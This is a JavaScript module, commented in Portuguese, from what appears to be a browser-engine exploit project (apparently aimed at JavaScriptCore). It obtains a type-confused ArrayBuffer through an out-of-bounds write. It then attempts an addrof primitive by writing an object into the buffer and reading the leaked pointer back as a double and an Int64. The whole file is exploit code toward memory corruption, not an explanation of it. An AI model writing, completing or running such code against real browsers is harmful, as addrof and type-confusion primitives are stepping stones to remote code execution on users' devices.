// js/script3/testArrayBufferVictimCrash.mjs (Modificado para addrof com getStableConfusedArrayBuffer)
import { logS3, PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs'; // Adicionado SHORT_PAUSE_S3 se necessário
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    getStableConfusedArrayBuffer, // Importa a função para obter o buffer confuso
    clearOOBEnvironment, // Para limpeza ao final
    // Não precisaremos mais de triggerOOB_primitive ou oob_write_absolute diretamente aqui
    // se getStableConfusedArrayBuffer cuidar da configuração para a confusão.
    isOOBReady // Poderia ser útil para checagens, mas getStableConfusedArrayBuffer deve garantir
} from '../core_exploit.mjs';
// JSC_OFFSETS e OOB_CONFIG de '../config.mjs' podem não ser diretamente necessários aqui.
// HEISENBUG_VICTIM_AB_SIZE é usado por getStableConfusedArrayBuffer.

// Nome do módulo atualizado para refletir a nova tentativa
export const FNAME_MODULE_V28 = "Heisenbug_Addrof_V2_DirectWrite";

let object_to_leak_for_addrof_attempt = null;

export async function executeArrayBufferVictimCrashTest() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.triggerAndAddrof`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Tentativa de Addrof com ArrayBuffer Confuso Estável e Escrita Direta ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_V28} Inic...`;

    object_to_leak_for_addrof_attempt = { marker: Date.now(), id: "MyTargetObjectFor_V2_DirectWrite" };

    let errorCapturedMain = null;
    let victim_ab_confused = null; // Para armazenar o ArrayBuffer confuso retornado

    let addrof_result = {
        success: false,
        leaked_address_as_double: null,
        leaked_address_as_int64: null,
        message: "Addrof não tentado ou ArrayBuffer confuso não obtido."
    };

    try {
        logS3("PASSO 1: Tentando obter um ArrayBuffer confuso estável via getStableConfusedArrayBuffer()...", "info", FNAME_CURRENT_TEST);
        // getStableConfusedArrayBuffer deve internamente:
        // 1. Chamar triggerOOB_primitive()
        // 2. Realizar a escrita OOB crítica (HEISENBUG_CRITICAL_WRITE_OFFSET, HEISENBUG_CRITICAL_WRITE_VALUE)
        // 3. Criar um ArrayBuffer candidato
        // 4. Verificar a confusão usando uma sonda toJSON interna
        // 5. Retornar o candidato se confuso, ou null caso contrário.
        victim_ab_confused = await getStableConfusedArrayBuffer();

        if (victim_ab_confused) {
            logS3(`  SUCESSO ao obter ArrayBuffer confuso. victim_ab_confused: ${victim_ab_confused}`, "vuln", FNAME_CURRENT_TEST);
            // Vamos verificar o tipo que o JavaScript percebe externamente para este buffer "confuso"
            logS3(`    Tipo aparente de victim_ab_confused (Object.prototype.toString): ${Object.prototype.toString.call(victim_ab_confused)}`, "info", FNAME_CURRENT_TEST);
            logS3(`    victim_ab_confused instanceof ArrayBuffer: ${victim_ab_confused instanceof ArrayBuffer}`, "info", FNAME_CURRENT_TEST);


            // PASSO 2: Criar uma Float64Array view sobre o ArrayBuffer confuso.
            // Isso é crucial. Se a confusão for tal que ele não seja mais utilizável como um ArrayBuffer
            // para a construção de TypedArrays, este passo falhará.
            let float64_view_on_victim;
            const fill_pattern = 0.987654321098765; // Padrão para verificar se a escrita ocorre

            try {
                float64_view_on_victim = new Float64Array(victim_ab_confused);
                // Preencher com um padrão conhecido para garantir que a leitura subsequente não seja lixo de memória
                // e para verificar se a escrita do addrof realmente alterou o conteúdo.
                float64_view_on_victim.fill(fill_pattern);
                logS3(`    Float64Array view criada sobre victim_ab_confused. Padrão preenchido em [0]: ${float64_view_on_victim[0]}`, "info", FNAME_CURRENT_TEST);
            } catch (e_view) {
                logS3(`    ERRO CRÍTICO ao tentar criar Float64Array sobre victim_ab_confused: ${e_view.message}`, "critical", FNAME_CURRENT_TEST);
                addrof_result.message = `Falha ao criar Float64Array no buffer confuso: ${e_view.message}. Isso pode indicar que a confusão o tornou incompatível.`;
                document.title = `${FNAME_MODULE_V28}: ViewCreation FAIL`;
                throw e_view; // Importante abortar se a view não puder ser criada
            }

            // PASSO 3: Tentar a escrita direta no ArrayBuffer confuso.
            // A hipótese é que, se type-confused para um JSObject, a atribuição de propriedade
            // victim_ab_confused[0] = object_to_leak_for_addrof_attempt;
            // pode resultar na escrita do ponteiro (ou valor relacionado) de object_to_leak_for_addrof_attempt
            // no buffer de dados subjacente de victim_ab_confused.
            logS3(`PASSO 3: Tentando escrever objeto alvo em victim_ab_confused[0] (escrita direta)... (Objeto alvo: ${JSON.stringify(object_to_leak_for_addrof_attempt)})`, "warn", FNAME_CURRENT_TEST);
            
            victim_ab_confused[0] = object_to_leak_for_addrof_attempt; // A escrita crucial para o addrof!
            
            logS3("    Escrita em victim_ab_confused[0] (supostamente) realizada.", "info", FNAME_CURRENT_TEST);

            await PAUSE_S3(SHORT_PAUSE_S3); // Uma pequena pausa, talvez ajude a estabilizar, se necessário.

            // PASSO 4: Ler da Float64Array view para verificar se o endereço foi vazado.
            logS3("PASSO 4: Lendo de float64_view_on_victim[0] para verificar o endereço vazado...", "warn", FNAME_CURRENT_TEST);
            const value_read_as_double = float64_view_on_victim[0];
            addrof_result.leaked_address_as_double = value_read_as_double;
            logS3(`    Valor lido de float64_view_on_victim[0]: ${value_read_as_double}`, "leak", FNAME_CURRENT_TEST);

            const double_buffer_for_conversion = new ArrayBuffer(8);
            const double_view_for_conversion = new Float64Array(double_buffer_for_conversion);
            const int32_view_for_double_conversion = new Uint32Array(double_buffer_for_conversion);
            double_view_for_conversion[0] = value_read_as_double;
            addrof_result.leaked_address_as_int64 = new AdvancedInt64(int32_view_for_double_conversion[0], int32_view_for_double_conversion[1]);
            logS3(`    Interpretado como Int64: ${addrof_result.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);

            // Heurística para verificar se é um ponteiro (ajustar conforme necessário)
            // E crucialmente, verificar se o valor mudou do padrão preenchido.
            if (value_read_as_double !== 0 && Math.abs(value_read_as_double - fill_pattern) > 1e-9 && // Mudou do padrão!
                (addrof_result.leaked_address_as_int64.high() < 0x00020000 || (addrof_result.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) { // Heurística de ponteiro
                logS3("  !!!! VALOR LIDO PARECE UM PONTEIRO POTENCIAL (addrof) !!!!", "vuln", FNAME_CURRENT_TEST);
                addrof_result.success = true;
                addrof_result.message = "ArrayBuffer confuso obtido E leitura de double (diferente do padrão) sugere um ponteiro.";
                document.title = `${FNAME_MODULE_V28}: Addr? ${addrof_result.leaked_address_as_int64.toString(true)}`;
            } else {
                let reason = "não parece ponteiro ou buffer não foi alterado do padrão.";
                if (Math.abs(value_read_as_double - fill_pattern) < 1e-9) {
                    reason = "buffer não foi alterado do padrão de preenchimento.";
                } else if (value_read_as_double === 0) {
                    reason = "valor lido foi zero.";
                }
                addrof_result.message = `ArrayBuffer confuso obtido, mas valor lido de float64_view_on_victim[0] ${reason}`;
                logS3(`    INFO: ${addrof_result.message} (Valor lido: ${value_read_as_double}, Padrão: ${fill_pattern})`, "warn", FNAME_CURRENT_TEST);
                document.title = `${FNAME_MODULE_V28}: Confusão OK, Addr Falhou`;
            }

        } else {
            logS3("  FALHA: getStableConfusedArrayBuffer() retornou null. Não foi possível obter um ArrayBuffer confuso estável.", "error", FNAME_CURRENT_TEST);
            addrof_result.message = "Falha ao obter ArrayBuffer confuso de getStableConfusedArrayBuffer.";
            document.title = `${FNAME_MODULE_V28}: Obtenção Confusão Falhou`;
        }

    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`ERRO CRÍTICO GERAL no teste ${FNAME_CURRENT_TEST}: ${e_outer_main.name} - ${e_outer_main.message}${e_outer_main.stack ? '\n' + e_outer_main.stack : ''}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_V28} CRASHED`;
        addrof_result.message = `Erro geral no teste: ${e_outer_main.name} - ${e_outer_main.message}`;
    } finally {
        // A documentação de getStableConfusedArrayBuffer em core_exploit.mjs diz:
        // "NÃO limpe o ambiente OOB aqui (clearOOBEnvironment()), pois o estado confuso
        // pode depender do oob_array_buffer_real e oob_dataview_real corrompidos."
        // O chamador (este script) é responsável pela limpeza quando terminar de usar o objeto confuso.
        logS3(`Limpando ambiente OOB após ${FNAME_CURRENT_TEST}...`, "info", FNAME_CURRENT_TEST);
        clearOOBEnvironment({ force_clear_even_if_not_setup: true }); // Forçar limpeza

        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Resultado Addrof: Success=${addrof_result.success}, Msg='${addrof_result.message}'`, addrof_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        if(addrof_result.leaked_address_as_int64){
            logS3(`  Addrof (Int64): ${addrof_result.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);
        }
        object_to_leak_for_addrof_attempt = null; // Limpar referência
    }

    // Manter uma estrutura de retorno similar, mas adaptada, pois não usamos a sonda toJSON desta vez.
    return {
        errorOccurred: errorCapturedMain,
        potentiallyCrashed: false, // Se chegamos aqui, não houve crash silencioso.
        stringifyResult: null,    // Não aplicável, pois não usamos JSON.stringify para a sonda.
        toJSON_details: { // Detalhes mínimos para compatibilidade, se necessário.
            probe_variant: "DirectWrite_After_StableConfusion_V2",
            // O tipo de this na sonda não é relevante aqui, mas podemos registrar o tipo do buffer confuso.
            this_type_in_toJSON: victim_ab_confused ? Object.prototype.toString.call(victim_ab_confused) : "N/A (buffer não obtido)",
            error_in_toJSON: null, // Não aplicável
            probe_called: false    // Não aplicável
        },
        addrof_attempt_result: addrof_result
    };
}
